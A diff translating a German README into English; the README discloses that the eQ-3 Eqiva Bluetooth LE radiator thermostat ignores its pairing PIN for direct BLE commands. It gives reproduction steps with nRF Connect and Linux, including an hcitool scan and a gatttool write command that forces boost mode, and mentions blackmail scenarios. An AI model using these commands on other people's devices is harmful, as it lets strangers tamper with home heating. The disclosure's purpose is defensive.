@@ -1,57 +1,51 @@
-# Sicherheitslücke in Thermostat eQ-3 Eqiva BLE
+# Security leak in smart home thermostat eQ-3 Eqiva BLE
 
-Bei dem [eQ-3 Eqiva](http://www.eq-3.de/produkte/eqiva/bluetooth-smart-heizkoerperthermostat.html) handelt es sich um einen smarten Heizungsthermostat mit einer integrierten Bluetooth LE Schnittstelle. Der Hersteller empfiehlt folgende App zum Steuern des Thermostates per Smartphone: [Calor BT](https://play.google.com/store/apps/details?id=de.eq3.ble.android&hl=de).
+[Beschreibung in Deutsch](Readme.md)
 
-Verbindet man sich per App mit dem Heizungsthermostat wird ein vierstelliger PIN Code abgefragt, der am Thermostat abgelesen werden muss. Ein Sicherheitsfeature, damit nur jemand den Thermostat steuern kann, der auch physischen Zugang zu ihm hat, z.B. in der eigenen Wohnung.
+The [eQ-3 Eqiva](http://www.eq-3.de/produkte/eqiva/bluetooth-smart-heizkoerperthermostat.html) is a smart home thermostat for radiators with an integrated Bluetooth LE interface. The manufacture recommends the following app to control the thermostat using a smartphone: [Calor BT](https://play.google.com/store/apps/details?id=de.eq3.ble.android&hl=de).
 
-Interessanterweise spielt dieser PIN Code jedoch keine Rolle, wenn man direkt BLE Befehle mit entsprechenden Werkzeugen - ein Smartphone ist ausreichend - an den Thermostaten sendet (siehe unten). **Dies bedeutet, dass jeder Thermostat in Reichweite (ca. 40m bei Bluetooth LE [1]) mit einfachsten Mitteln fern- und damit fremdgesteuert werden kann.**
+When using the app to connect to the thermostat a 4 digit PIN code which has to be read from the thermostat must be entered. This is an important security feature to only allow persons that have physical access to the thermostat to control it remotely.
 
-Angriffsmotive reichen von dem einfachen Verstellen der Einstellungen bis hin zu Erpressungsszenarien wie dem Abstellen der Heizung bis ein entsprechender Geldbetrag gezahlt wurde.
+Surprisingly this PIN code is not necessary when sending Bluetooth LE commands directly to the thermostat using the corresponding tools (an Android smartphone is sufficient, see below). **This means that anyone within the Bluetooth LE range of around 40m can control and therefore hijack the thermostat.**
 
-**Im Moment kann nur dazu geraten werden die Bluetoothfunktion im Thermostat zu deaktivieren.**
+Attack reasons reach from the sole purpose of changing the settings to blackmailing where the radiator is turned off until a certain amount of money has been paid.
 
-IMHO: _Wie dieses Gerät mit dieser gravierenden Sicherheitslücke Testsieger bei Stiftung Warentest werden konnte ist mir ein Rätsel._
+**At the moment it has to be advised to turn the Bluetooth feature off completely within the thermostat settings.**
 
 ## Android
 
-### 1\. nRF Connect installieren
+### 1\. Install nRF Connect
 
 <https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp&hl=de>
 
-### 2\. Mit Thermostat verbinden
+### 2\. Connect with the thermostat
 
 ![01-nrf-connect](/img/01-nrf-connect.png)
 
-### 3\. BLE Charactristic auswählen
+### 3\. Select BLE Characteristic
 
 ![02-nrf-connect](/img/02-nrf-connect.png)
 
-### 4\. Boostmodus aktivieren (Ventil wird voll geöffnet)
+### 4\. Activate boost mode (Fully open the valve)
 
 ![03-nrf-connect](/img/03-nrf-connect.png)
 
-## Linux (getestet mit Raspberry Pi 3 und Raspbian)
+## Linux (tested with Raspberry Pi 3 and Raspbian)
 
-### 1\. Nach BLE Geräten suchen
+### 1\. Scan for BLE devices
 
 `hcitool lescan`
 
 ![HCI Tool Scan Example](/img/01-hcitool-scan.png)
 
-Gerät mit Name "CC-RT-BLE" ist der Thermostat.
+Device with name "CC-RT-BLE" is the thermostat.
 
-### 2\. Boostmodus aktivieren (Ventil wird voll geöffnet)
+### 2\. Activate boost mode (Fully open the valve)
 
 `gatttool -b 00:1A:22:09:DA:10 --char-write-req --handle=0x0411 --value=4501`
 
-_Entsprechend die MAC-Adresse austauschen._
+_Change MAC address accordingly._
 
-## Weitere Informationen unter:
+## Further information:
 
-- [eq-3 Eqiva API Dokumentation von Heckie75 bei Github](https://github.com/Heckie75/eQ-3-radiator-thermostat/blob/master/eq-3-radiator-thermostat-api.md)
-
-- [FHEM Forum](https://forum.fhem.de/index.php/topic,39308.0.html)
-
-## Referenzen:
-
-[1] - <https://de.wikipedia.org/wiki/Bluetooth_Low_Energy>
+- [eq-3 Eqiva API Documentation by Heckie75 at Github](https://github.com/Heckie75/eQ-3-radiator-thermostat/blob/master/eq-3-radiator-thermostat-api.md)
